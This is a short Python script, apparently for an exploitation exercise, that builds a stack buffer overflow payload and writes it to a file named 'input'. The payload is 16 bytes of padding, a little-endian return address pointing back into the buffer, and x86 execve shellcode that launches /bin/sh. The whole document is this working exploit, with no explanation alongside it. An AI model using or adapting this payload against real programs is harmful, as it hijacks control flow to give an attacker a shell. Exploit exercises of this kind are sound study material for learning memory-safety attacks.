BUFFERSTART = 0xffff0c14

def LittleEndian(hexnum):
  s = ""
  s += chr( (hexnum) & 0xff)
  s += chr( (hexnum >> 8) & 0xff)
  s += chr( (hexnum >> 16) & 0xff) 
  s += chr( (hexnum >> 24) & 0xff) 
  return s

bufferstart = BUFFERSTART

# shellcode is split to enable easy hard-coded address patching
addr_of_shellcode = bufferstart + 16 + 4
shellcode_p1 = "1\xd21\xc9\xbb"
address_of_sh = bufferstart + 16 + 4 + 15
shellcode_p2 = "1\xc0\xb0\x0b\xcd\x80"

payload = ""
payload += "a"*16
payload += LittleEndian(addr_of_shellcode)
payload += shellcode_p1
payload += LittleEndian(address_of_sh)
payload += shellcode_p2
payload += "/bin/sh\x00"

#for c in payload:
#  sys.stdout.write("\\x" + hex(ord(c))[2:].zfill(2))
#sys.stdout.write('\n')

fp = open("input","wb")
fp.write(payload)
fp.close()
